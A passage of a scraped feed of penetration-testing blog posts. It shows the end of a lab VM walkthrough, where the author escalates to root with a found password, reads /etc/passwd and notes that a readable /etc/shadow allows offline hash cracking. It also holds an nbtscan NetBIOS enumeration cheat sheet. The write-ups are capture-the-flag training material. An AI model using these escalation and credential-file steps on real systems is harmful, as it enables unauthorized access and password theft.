class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>1<span class=\"o\">(</span>daemon<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>1<span class=\"o\">(</span>daemon<span class=\"o\">)</span>\n\ndaemon@Freshly:/<span class=\"nv\">$ </span>su -\nsu -\nPassword: SuperSecretPassword\n\nroot@Freshly:~# <span class=\"nb\">id\nid\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>0<span class=\"o\">(</span>root<span class=\"o\">)</span></code></pre> \n</figure> \n<h2 id=\"post-exploitation-enumeration\">Post Exploitation Enumeration</h2> \n<p>The file <code>/etc/passwd</code> contained the text:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">root@Freshly:/# <span class=\"nb\">tail</span> <span class=\"nt\">-n</span> 5 /etc/passwd\n<span class=\"nb\">tail</span> <span class=\"nt\">-n</span> 5 /etc/passwd\nuser:x:1000:1000:user,,,:/home/user:/bin/bash\nmysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false\ncandycane:x:1001:1001::/home/candycane:\n<span class=\"c\"># YOU STOLE MY SECRET FILE!</span>\n<span class=\"c\"># SECRET = \"NOBODY EVER GOES IN, AND NOBODY EVER COMES OUT!\"</span></code></pre> \n</figure> \n<p>Additionally the file <code>/etc/shadow</code> had incorrect permissions allowing a non privileged user read access, allowing for offline password cracking using Hashcat / JTR.</p> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Sun, 14 Jun 2015 00:00:00 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/freshly/dirbuster.png","linkMd5":"1ee26661521b1ff7dfbce2b4ae6f4a5e","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn23@2020_4/2020/08/25/01-24-54-307_1f47c99832a26be7.webp","destWidth":767,"destHeight":542,"sourceBytes":36979,"destBytes":47606,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/freshly/dirbuster.png":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn23@2020_4/2020/08/25/01-24-54-307_1f47c99832a26be7.webp","https://highon.coffee/img/blog/freshly/login.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn32@2020_5/2020/08/25/01-25-14-363_abe7d2cc304e9cc8.webp","https://highon.coffee/img/blog/freshly/wordpress-php-shell.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn15@2020_1/2020/08/25/01-25-15-789_d9bdca2d4a6e64f6.webp"},"publishedOrCreatedDate":1598318675551},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"nbtscan Cheat Sheet","link":"https://highon.coffee/blog/nbtscan-cheat-sheet/","description":"<p><strong><a href=\"http://www.unixwiz.net/tools/nbtscan.html\">nbtscan</a></strong> is a command line tool that finds exposed NETBIOS nameservers, it’s a good first step for finding open shares.</p> \n<div class=\"note tip\"> \n <h5>Don't use the version of nbtscan that ships with KALI</h5> \n <p>Grab nbtscan from the above link and build it from source, this version tends to find more information</p> \n</div> \n<h3 id=\"compile-nbtscan-on-kali\">Compile nbtscan on KALI</h3> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">root@kali:~/nbtscan# wget http://www.unixwiz.net/tools/nbtscan-source-1.0.35.tgz\nroot@kali:~/nbtscan# <span class=\"nb\">tar</span> <span class=\"nt\">-xvzf</span> nbtscan-source-1.0.35.tgz\nroot@kali:~/nbtscan# make\nroot@kali:~/nbtscan# ./nbtscan\nnbtscan 1.0.35 - 2008-04-08 - http://www.unixwiz.net/tools/\n\nusage: ./nbtscan <span class=\"o\">[</span>options] target <span class=\"o\">[</span>targets...]\n\n   Targets are lists of IP addresses, DNS names, or address\n   ranges. Ranges can be <span class=\"k\">in</span> /nbits notation <span class=\"o\">(</span><span class=\"s2\">\"192.168.12.0/24\"</span><span class=\"o\">)</span>\n   or with a range <span class=\"k\">in </span>the last octet <span class=\"o\">(</span><span class=\"s2\">\"192.168.12.64-97\"</span><span class=\"o\">)</span></code></pre>\n</figure> \n<h3 id=\"nbtscan-cheat-sheet\">nbtscan Cheat Sheet</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>nbtscan -v</code></p> </td> \n    <td> <p>Displays the nbtscan version</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nbtscan -f target(s)</code></p> </td> \n    <td> <p>This shows the full NBT resource record responses for each machine scanned, not a one line summary, use this options when scanning a single host</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nbtscan -O file-name.txt target(s)</code></p> </td> \n    <td> <p>Sends output to a file</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nbtscan -H</code></p> </td> \n    <td> <p>Generate an HTTP header</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nbtscan -P</code></p> </td> \n    <td> <p>Generate Perl hashref output, which can be loaded into an existing program for easier processing, much easier than parsing text output</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nbtscan -V</code></p> </td> \n    <td> <p>Enable verbose mode</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nbtscan -n</code></p> </td> \n    <td> <p>Turns off this inverse name lookup, for hanging resolution</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nbtscan -p PORT target(s)</code></p> </td> \n    <td> <p>This allows specification of a UDP port number to be used as the source in sending a query</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>nbtscan -m</code></p> </td> \n    <td> <p>Include the MAC (aka \"Ethernet\") addresses in the response, which is already implied by the -f option.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div>","descriptionType":"text/html","publishedDate":"Sun, 29 Mar 2015 14:37:10 +0000","feedId":11390,"bgimg":"","linkMd5":"042a54dd95f47917d9dc0d24b551bb2e","bgimgJsdelivr":"","metaImg":"","author":"Arr0way","publishedOrCreatedDate":1598318675551},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Sokar - Walkthrough","link":"https://highon.coffee/blog/sokar-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i><i class=\"fa fa-coffee\"></i><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/sokar-walkthrough/#description\" id=\"markdown-toc-description\">Description</a></li> \n <li><a href=\"https://highon.coffee/blog/sokar-walkthrough/#enumeration\" id=\"markdown-toc-enumeration\">Enumeration</a> \n  <ul> \n   <li><a
